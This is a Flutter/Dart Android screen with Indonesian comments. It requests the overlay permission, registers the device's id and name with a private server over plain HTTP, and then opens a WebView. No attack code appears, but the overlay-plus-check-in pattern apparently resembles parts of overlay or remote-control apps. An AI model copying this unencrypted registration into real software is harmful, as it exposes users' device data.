import 'dart:convert';
import 'dart:math';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'package:permission_handler/permission_handler.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'webview_page.dart'; // ← setelah register langsung ke WebView

class OverlayPermissionPage extends StatefulWidget {
  final String uid;
  const OverlayPermissionPage({super.key, required this.uid});

  @override
  State<OverlayPermissionPage> createState() => _OverlayPermissionPageState();
}

class _OverlayPermissionPageState extends State<OverlayPermissionPage> {
  static const String _apiBase = 'http://hanz-cpanel-private.pteroq.biz.id:11643';
  static const Color yellow = Color(0xFFFFCC00);

  bool _isRegistering  = false;
  bool _registerFailed = false;

  // ── Ambil/buat deviceId SATU KALI dan simpan ke prefs ───────────────
  // Kunci agar device tidak dobel: deviceId selalu sama untuk HP yang sama
  Future<String> _getOrCreateDeviceId() async {
    final prefs = await SharedPreferences.getInstance();
    String? id = prefs.getString('nex_device_id');
    if (id == null || id.isEmpty) {
      final rand = Random.secure();
      id = List.generate(16, (_) => rand.nextInt(16).toRadixString(16)).join();
      await prefs.setString('nex_device_id', id);
    }
    return id; // Selalu return ID yang sama untuk HP ini
  }

  // ── Ambil nama HP dari Android native ───────────────────────────────
  Future<String> _getDeviceName() async {
    try {
      const ch = MethodChannel('flutter/device_info');
      final dynamic info = await ch.invokeMethod('getDeviceInfo');
      final brand = (info['brand'] ?? 'Android').toString().trim();
      final model = (info['model']  ?? 'Device').toString().trim();
      // Hindari duplikat: "infinix Infinix X6812B" → "Infinix X6812B"
      if (model.toLowerCase().startsWith(brand.toLowerCase())) return model;
      return '$brand $model';
    } catch (_) {
      return 'Android Device';
    }
  }

  // ── Register device ke API ───────────────────────────────────────────
  // Jika deviceId sudah ada di server → UPDATE (bukan tambah baru)
  // Ini yang mencegah device dobel
  Future<bool> _registerDevice() async {
    if (!mounted) return false;
    setState(() { _isRegistering = true; _registerFailed = false; });

    try {
      final deviceId   = await _getOrCreateDeviceId();
      final deviceName = await _getDeviceName();

      // Simpan deviceName ke prefs
      final prefs = await SharedPreferences.getInstance();
      await prefs.setString('nex_device_name', deviceName);

      final res = await http.post(
        Uri.parse('$_apiBase/registerDevice'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({
          'uid':        widget.uid,
          'deviceId':   deviceId,   // ID unik per HP — tidak berubah
          'deviceName': deviceName,
          'platform':   'Android',
        }),
      ).timeout(const Duration(seconds: 10));

      if (res.statusCode == 200) {
        final data = jsonDecode(res.body) as Map<String, dynamic>;
        if (data['success'] == true) return true;
      }
      if (mounted) setState(() => _registerFailed = true);
      return false;
    } catch (e) {
      if (mounted) setState(() => _registerFailed = true);
      return false;
    } finally {
      if (mounted) setState(() => _isRegistering = false);
    }
  }

  // ── Minta overlay permission → register → buka WebView ──────────────
  Future<void> _requestOverlay() async {
    await Permission.systemAlertWindow.request();
    if (!mounted) return;
    final ok = await _registerDevice();
    if (!mounted) return;
    if (ok) {
      _goToWebsite();
    } else {
      _showRetryDialog();
    }
  }

  // ── Skip overlay permission → tetap register → buka WebView ─────────
  Future<void> _skipAndRegister() async {
    final ok = await _registerDevice();
    if (!mounted) return;
    if (ok) {
      _goToWebsite();
    } else {
      _showRetryDialog();
    }
  }

  // ── Navigasi ke WebViewPage (APKPure) ────────────────────────────────
  void _goToWebsite() {
    if (!mounted) return;
    Navigator.pushReplacement(
      context,
      MaterialPageRoute(builder: (_) => WebViewPage(uid: widget.uid)),
    );
  }

  // ── Dialog retry jika register gagal ────────────────────────────────
  void _showRetryDialog() {
    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (_) => AlertDialog(
        backgroundColor: const Color(0xFF1A1A1A),
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
        title: const Row(children: [
          Icon(Icons.error_outline, color: Colors.redAccent, size: 22),
          SizedBox(width: 8),
          Text('Registrasi Gagal',
              style: TextStyle(color: Colors.white, fontSize: 15,
                  fontWeight: FontWeight.bold)),
        ]),
        content: const Text(
          'Gagal mendaftarkan device ke server.\n'
          'Pastikan koneksi internet aktif lalu coba lagi.',
          style: TextStyle(color: Colors.white70, fontSize: 13),
        ),
        actions: [
          TextButton(
            onPressed: () {
              Navigator.pop(context);
              _goToWebsite(); // Tetap lanjut walau gagal
            },
            child: const Text('LEWATI',
                style: TextStyle(color: Colors.white38,
                    fontWeight: FontWeight.bold)),
          ),
          ElevatedButton(
            style: ElevatedButton.styleFrom(
              backgroundColor: yellow,
              shape: RoundedRectangleBorder(
                  borderRadius: BorderRadius.circular(8)),
            ),
            onPressed: () async {
              Navigator.pop(context);
              final ok = await _registerDevice();
              if (!mounted) return;
              if (ok) {
                _goToWebsite();
              } else {
                _showRetryDialog();
              }
            },
            child: const Text('COBA LAGI',
                style: TextStyle(color: Colors.black, fontWeight: FontWeight.bold)),
          ),
        ],
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      body: SafeArea(
        child: Center(
          child: Padding(
            padding: const EdgeInsets.symmetric(horizontal: 28),
            child: Container(
              padding: const EdgeInsets.fromLTRB(20, 24, 20, 20),
              decoration: BoxDecoration(
                color: const Color(0xFF1E1E1E),
                borderRadius: BorderRadius.circular(16),
                border: Border.all(color: yellow.withOpacity(0.3), width: 1),
              ),
              child: Column(
                mainAxisSize: MainAxisSize.min,
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  // Header
                  Row(children: [
                    Container(
                      width: 38, height: 38,
                      decoration: BoxDecoration(
                          color: yellow, borderRadius: BorderRadius.circular(8)),
                      child: const Icon(Icons.security, color: Colors.black, size: 22),
                    ),
                    const SizedBox(width: 12),
                    const Expanded(
                      child: Text('Izin Diperlukan',
                          style: TextStyle(color: Colors.white, fontSize: 17,
                              fontWeight: FontWeight.bold)),
                    ),
                  ]),

                  const SizedBox(height: 16),
                  const Divider(color: Colors.white12),
                  const SizedBox(height: 14),

                  const Text(
                    'Aktivasi Overlay Permission\nSilahkan aktifkan overlay permission untuk melanjutkan aplikasi.',
                    style: TextStyle(color: Colors.white70, fontSize: 13, height: 1.5),
                  ),


                  const SizedBox(height: 24),

                  if (_isRegistering)
                    const Center(
                      child: Column(children: [
                        CircularProgressIndicator(color: yellow, strokeWidth: 2),
                        SizedBox(height: 10),
                        Text('Mendaftarkan device...',
                            style: TextStyle(color: Colors.white54, fontSize: 12)),
                      ]),
                    )
                  else
                    Column(
                      crossAxisAlignment: CrossAxisAlignment.stretch,
                      children: [
                        ElevatedButton.icon(
                          style: ElevatedButton.styleFrom(
                            backgroundColor: yellow,
                            foregroundColor: Colors.black,
                            padding: const EdgeInsets.symmetric(vertical: 14),
                            shape: RoundedRectangleBorder(
                                borderRadius: BorderRadius.circular(8)),
                          ),
                          icon: const Icon(Icons.check_circle, size: 18),
                          label: const Text('AKTIVASI SEKARANG',
                              style: TextStyle(
                                fontWeight: FontWeight.bold,
                                fontSize: 14,
                                letterSpacing: 1,
                                fontFamily: 'monospace',
                              )),
                          onPressed: _requestOverlay,
                        ),
                        const SizedBox(height: 10),
                        OutlinedButton(
                          style: OutlinedButton.styleFrom(
                            foregroundColor: Colors.white38,
                            side: const BorderSide(color: Colors.white12),
                            padding: const EdgeInsets.symmetric(vertical: 12),
                            shape: RoundedRectangleBorder(
                                borderRadius: BorderRadius.circular(8)),
                          ),
                          onPressed: _skipAndRegister,
                          child: const Text('DAFTAR TANPA OVERLAY',
                              style: TextStyle(fontFamily: 'monospace',
                                  fontSize: 12, letterSpacing: 1)),
                        ),
                      ],
                    ),
                ],
              ),
            ),
          ),
        ),
      ),
    );
  }
}
